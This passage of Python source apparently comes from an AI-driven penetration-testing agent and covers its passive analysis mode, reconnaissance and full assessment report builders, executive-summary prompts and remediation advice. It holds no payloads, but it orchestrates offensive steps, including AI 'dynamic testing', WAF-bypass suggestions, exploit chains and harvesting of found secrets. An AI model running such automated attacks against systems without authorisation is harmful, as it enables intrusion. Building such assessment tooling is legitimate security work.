            # AI DYNAMIC TESTING - handles ANY vulnerability type!
            # Examples: XXE, Race Condition, Rate Limiting, BOLA, BFLA, JWT, GraphQL,
            # NoSQL Injection, WAF Bypass, CSP Bypass, Prototype Pollution, etc.
            await self.log("info", f"  [AI] Dynamic testing for: {step}")
            await self._ai_dynamic_test(step)

    # ==================== ANALYZE-ONLY MODE ====================

    async def _run_analyze_only(self) -> Dict:
        """Analyze-only mode"""
        await self.log("info", "ANALYZE-ONLY MODE: No active testing")
        await self._update_progress(0, "Starting analysis")

        # Load any provided context
        if self.recon_context:
            await self.log("info", "[PHASE 1/2] Loading context")
            self._load_context()
        else:
            await self.log("info", "[PHASE 1/2] Passive reconnaissance")
            await self._initial_probe()

        await self._update_progress(50, "Context loaded")

        # AI Analysis
        await self.log("info", "[PHASE 2/2] AI Analysis")
        analysis = await self._ai_passive_analysis()
        await self._update_progress(100, "Analysis complete")

        return {
            "type": "analysis_only",
            "target": self.target,
            "mode": self.mode.value,
            "scan_date": datetime.utcnow().isoformat(),
            "analysis": analysis,
            "recon": {
                "endpoints": len(self.recon.endpoints),
                "technologies": self.recon.technologies
            },
            "findings": [],
            "recommendations": ["Perform active testing for complete assessment"]
        }

    def _load_context(self):
        """Load recon context"""
        if not self.recon_context:
            return
        data = self.recon_context.get("data", {})
        self.recon.endpoints = [{"url": e} for e in data.get("endpoints", [])]
        self.recon.technologies = data.get("technologies", [])

    async def _ai_passive_analysis(self) -> str:
        """AI passive analysis"""
        if not self.llm.is_available():
            return "LLM not available for analysis"

        context = f"""Target: {self.target}
Endpoints: {[_get_endpoint_url(e) for e in self.recon.endpoints[:20]]}
Technologies: {self.recon.technologies}
Forms: {len(self.recon.forms)}"""

        prompt = f"""Perform a security analysis WITHOUT active testing:

{context}

Analyze and identify:
1. Potential security risks
2. Areas requiring testing
3. Technology-specific concerns
4. Recommendations

Provide your analysis:"""

        try:
            return await self.llm.generate(prompt,
                get_system_prompt("reporting"),
                task_type="passive_analysis")
        except Exception:
            return "Analysis failed"

    # ==================== REPORT GENERATION ====================

    def _generate_recon_report(self, ai_analysis: Optional[Dict] = None) -> Dict:
        """Generate comprehensive recon report, optionally enriched with AI analysis."""
        waf_detected = bool(self.recon.waf_info and self.recon.waf_info.get("detected"))

        report = {
            "type": "reconnaissance",
            "target": self.target,
            "mode": self.mode.value,
            "scan_date": datetime.utcnow().isoformat(),
            "summary": {
                "target": self.target,
                "endpoints_found": len(self.recon.endpoints),
                "forms_found": len(self.recon.forms),
                "subdomains_found": len(self.recon.subdomains),
                "ports_found": len(self.recon.ports),
                "technologies": self.recon.technologies,
                "recon_depth": self.recon.recon_depth,
                "waf_detected": waf_detected,
                "ai_enhanced": ai_analysis is not None and not ai_analysis.get("parse_error"),
            },
            "data": {
                "endpoints": self.recon.endpoints,
                "forms": self.recon.forms,
                "technologies": self.recon.technologies,
                "api_endpoints": self.recon.api_endpoints,
                "subdomains": self.recon.subdomains,
                "ports": self.recon.ports,
                "dns_records": self.recon.dns_records,
                "js_files": self.recon.js_files,
                "urls": self.recon.urls[:500],
                "interesting_paths": self.recon.interesting_paths,
                "secrets": self.recon.secrets,
                "live_hosts": self.recon.live_hosts,
                "parameters": self.recon.parameters,
            },
            # Provide endpoints under "recon" key so agent.py endpoint persistence works
            "recon": {
                "endpoints": self.recon.endpoints,
            },
            "waf_detection": self.recon.waf_info,
            "findings": [],
            "recommendations": self._generate_recon_recommendations(),
        }

        # Enrich with AI analysis if available
        if ai_analysis and not ai_analysis.get("parse_error"):
            report["ai_analysis"] = ai_analysis

            # Strategic recommendations (structured list)
            ai_recs = ai_analysis.get("strategic_recommendations", [])
            if ai_recs:
                report["recommendations_ai"] = ai_recs
                # Append summary text versions to the existing recommendations list
                for rec in ai_recs[:10]:
                    if isinstance(rec, dict):
                        priority = rec.get("priority", "P3")
                        action = rec.get("action", "")
                        if action:
                            report["recommendations"].append(f"[{priority}] {action}")

            # High-value targets for easy frontend consumption
            hvt = ai_analysis.get("high_value_targets", [])
            if hvt:
                report["high_value_targets"] = hvt

            # Technology analysis
            tech_analysis = ai_analysis.get("technology_analysis", [])
            if tech_analysis:
                report["technology_analysis"] = tech_analysis

            # Attack surface summary
            surface_summary = ai_analysis.get("attack_surface_summary", "")
            if surface_summary:
                report["summary"]["attack_surface_analysis"] = surface_summary

        elif ai_analysis and ai_analysis.get("parse_error"):
            # Store raw text analysis if JSON parsing failed
            report["ai_analysis_raw"] = ai_analysis.get("raw_analysis", "")

        return report

    def _generate_recon_recommendations(self) -> List[str]:
        """Generate actionable recommendations based on recon findings."""
        recs = []

        if self.recon.subdomains:
            recs.append(f"Investigate {len(self.recon.subdomains)} discovered subdomains for additional attack surface")

        if self.recon.secrets:
            recs.append(f"URGENT: {len(self.recon.secrets)} potential secrets/credentials found in JavaScript or config files")

        if self.recon.waf_info and self.recon.waf_info.get("detected"):
            waf_names = ", ".join(w["name"] for w in self.recon.waf_info.get("wafs", []))
            recs.append(f"WAF detected ({waf_names}) - consider WAF bypass techniques for vulnerability testing")

        if self.recon.interesting_paths:
            high_risk = [p for p in self.recon.interesting_paths if isinstance(p, dict) and p.get("risk") == "high"]
            if high_risk:
                recs.append(f"{len(high_risk)} high-risk sensitive paths found (e.g. .git, .env, debug endpoints) - investigate immediately")

        api_eps = [ep for ep in self.recon.endpoints if isinstance(ep, dict) and "/api" in ep.get("url", "").lower()]
        if api_eps:
            recs.append(f"{len(api_eps)} API endpoints discovered - test for authentication bypass, IDOR, and injection vulnerabilities")

        if self.recon.ports:
            recs.append(f"{len(self.recon.ports)} open ports found - examine non-standard services for misconfigurations")

        if self.recon.js_files:
            recs.append(f"{len(self.recon.js_files)} JavaScript files found - analyze for hardcoded secrets, API keys, and internal endpoints")

        forms_with_params = [f for f in self.recon.forms if f.get("inputs")]
        if forms_with_params:
            recs.append(f"{len(forms_with_params)} forms with input fields found - test for XSS, CSRF, and injection vulnerabilities")

        if self.recon.parameters:
            total_params = sum(len(v) for v in self.recon.parameters.values())
            recs.append(f"{total_params} query parameters across {len(self.recon.parameters)} paths - prioritize for injection testing")

        if not recs:
            recs.append("Proceed with vulnerability testing based on discovered endpoints")

        return recs

    async def _generate_full_report(self) -> Dict:
        """Generate comprehensive report"""
        # Convert findings to dict
        findings_data = []
        for f in self.findings:
            findings_data.append({
                "id": f.id,
                "title": f.title,
                "severity": f.severity,
                "vulnerability_type": f.vulnerability_type,
                "cvss_score": f.cvss_score,
                "cvss_vector": f.cvss_vector,
                "cwe_id": f.cwe_id,
                "description": f.description,
                "affected_endpoint": f.affected_endpoint,
                "parameter": f.parameter,
                "payload": f.payload,
                "evidence": f.evidence,
                "impact": f.impact,
                "poc_code": f.poc_code,
                "remediation": f.remediation,
                "references": f.references,
                "ai_verified": f.ai_verified,
                "confidence": f.confidence,
                "ai_status": f.ai_status,
                "rejection_reason": f.rejection_reason,
            })

        # Convert rejected findings to dict
        rejected_data = []
        for f in self.rejected_findings:
            rejected_data.append({
                "id": f.id,
                "title": f.title,
                "severity": f.severity,
                "vulnerability_type": f.vulnerability_type,
                "cvss_score": f.cvss_score,
                "cvss_vector": f.cvss_vector,
                "cwe_id": f.cwe_id,
                "description": f.description,
                "affected_endpoint": f.affected_endpoint,
                "parameter": f.parameter,
                "payload": f.payload,
                "evidence": f.evidence,
                "impact": f.impact,
                "poc_code": f.poc_code,
                "remediation": f.remediation,
                "references": f.references,
                "ai_verified": False,
                "confidence": "low",
                "ai_status": "rejected",
                "rejection_reason": f.rejection_reason,
            })

        # Count by severity
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

        # Generate recommendations
        recommendations = self._generate_recommendations()

        report = {
            "type": "full_assessment",
            "target": self.target,
            "mode": self.mode.value,
            "scan_id": self.scan_id,
            "scan_date": datetime.utcnow().isoformat(),
            "duration": "N/A",
            "summary": {
                "target": self.target,
                "mode": self.mode.value,
                "total_findings": len(self.findings),
                "severity_breakdown": severity_counts,
                "endpoints_tested": len(self.recon.endpoints),
                "technologies": self.recon.technologies,
                "risk_level": self._calculate_risk_level(severity_counts),
            },
            "findings": findings_data,
            "rejected_findings": rejected_data,
            "recommendations": recommendations,
            "executive_summary": await self._generate_executive_summary(findings_data, severity_counts),
            "tool_executions": self.tool_executions,
        }

        # Add governance audit trail
        if self.governance:
            report["governance"] = self.governance.get_summary()

        # Add autonomy module stats
        if self.request_engine:
            report["request_stats"] = self.request_engine.get_stats()
        if self._waf_result and self._waf_result.detected_wafs:
            report["waf_detection"] = {
                "detected": [{"name": w.name, "confidence": w.confidence, "method": w.detection_method}
                             for w in self._waf_result.detected_wafs],
                "blocking_patterns": self._waf_result.blocking_patterns,
            }
        if self.strategy:
            report["strategy_adaptation"] = self.strategy.get_report_context()
        if self.chain_engine:
            report["exploit_chains"] = self.chain_engine.get_attack_graph()
        if self.auth_manager:
            report["auth_status"] = self.auth_manager.get_auth_summary()

        # Include LLM cost data if available
        if hasattr(self, 'llm') and self.llm and hasattr(self.llm, 'cost_tracker'):
            try:
                report["cost_report"] = self.llm.cost_tracker.report()
            except Exception:
                pass

        # Log summary
        await self.log("info", "=" * 60)
        await self.log("info", "ASSESSMENT COMPLETE")
        await self.log("info", f"Total Findings: {len(self.findings)}")
        await self.log("info", f"  Critical: {severity_counts['critical']}")
        await self.log("info", f"  High: {severity_counts['high']}")
        await self.log("info", f"  Medium: {severity_counts['medium']}")
        await self.log("info", f"  Low: {severity_counts['low']}")
        await self.log("info", f"  AI-Rejected (for manual review): {len(self.rejected_findings)}")
        await self.log("info", "=" * 60)

        return report

    async def _generate_executive_summary(self, findings: List, counts: Dict) -> str:
        """Generate executive summary"""
        if not self.llm.is_available() or not findings:
            if counts.get('critical', 0) > 0:
                return f"Critical vulnerabilities found requiring immediate attention. {counts['critical']} critical and {counts['high']} high severity issues identified."
            elif counts.get('high', 0) > 0:
                return f"High severity vulnerabilities found. {counts['high']} high severity issues require prompt remediation."
            else:
                return "Assessment completed. Review findings and implement recommended security improvements."

        # Build finding summary for context
        finding_summary = []
        for f in findings[:5]:
            finding_summary.append(f"- [{f.get('severity', 'unknown').upper()}] {f.get('title', 'Unknown')}")

        risk_level = self._calculate_risk_level(counts)

        prompt = f"""Generate a professional executive summary for this penetration testing report.

**Assessment Overview:**
- Target: {self.target}
- Assessment Type: Automated Security Assessment
- Overall Risk Rating: {risk_level}

**Findings Summary:**
- Total Vulnerabilities: {len(findings)}
- Critical: {counts.get('critical', 0)}
- High: {counts.get('high', 0)}
- Medium: {counts.get('medium', 0)}
- Low: {counts.get('low', 0)}
- Informational: {counts.get('info', 0)}

**Key Findings:**
{chr(10).join(finding_summary) if finding_summary else '- No significant vulnerabilities identified'}

**Required Output:**
Write a 3-4 sentence executive summary that:
1. States the overall security posture (good/needs improvement/critical issues)
2. Highlights the most important finding(s) and their business impact
3. Provides a clear call to action for remediation

Write in a professional, non-technical tone suitable for C-level executives and board members."""

        try:
            return await self.llm.generate(prompt,
                get_system_prompt("reporting"),
                task_type="executive_summary")
        except Exception:
            return "Assessment completed. Review findings for details."

    def _calculate_risk_level(self, counts: Dict) -> str:
        """Calculate overall risk level"""
        if counts.get("critical", 0) > 0:
            return "CRITICAL"
        elif counts.get("high", 0) > 0:
            return "HIGH"
        elif counts.get("medium", 0) > 0:
            return "MEDIUM"
        elif counts.get("low", 0) > 0:
            return "LOW"
        return "INFO"

    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations"""
        recommendations = []

        vuln_types = set(f.vulnerability_type for f in self.findings)

        if "sqli" in vuln_types:
            recommendations.append("Implement parameterized queries/prepared statements to prevent SQL injection")
        if "xss" in vuln_types:
            recommendations.append("Implement output encoding and Content Security Policy (CSP) headers")
        if "lfi" in vuln_types:
            recommendations.append("Validate and sanitize all file path inputs; implement allowlists")
        if "ssti" in vuln_types:
            recommendations.append("Use logic-less templates or properly sandbox template engines")
        if "ssrf" in vuln_types:
            recommendations.append("Validate and restrict outbound requests; use allowlists for URLs")
        if "rce" in vuln_types:
            recommendations.append("Avoid executing user input; use safe APIs instead of system commands")

        if not recommendations:
            recommendations.append("Continue regular security assessments and penetration testing")
            recommendations.append("Implement security headers (CSP, X-Frame-Options, etc.)")
            recommendations.append("Keep all software and dependencies up to date")

        return recommendations

    def _generate_error_report(self, error: str) -> Dict:
        """Generate error report"""
        return {
            "type": "error",
            "target": self.target,
            "mode": self.mode.value,
            "error": error,
            "findings": [],
            "summary": {"error": error}
        }
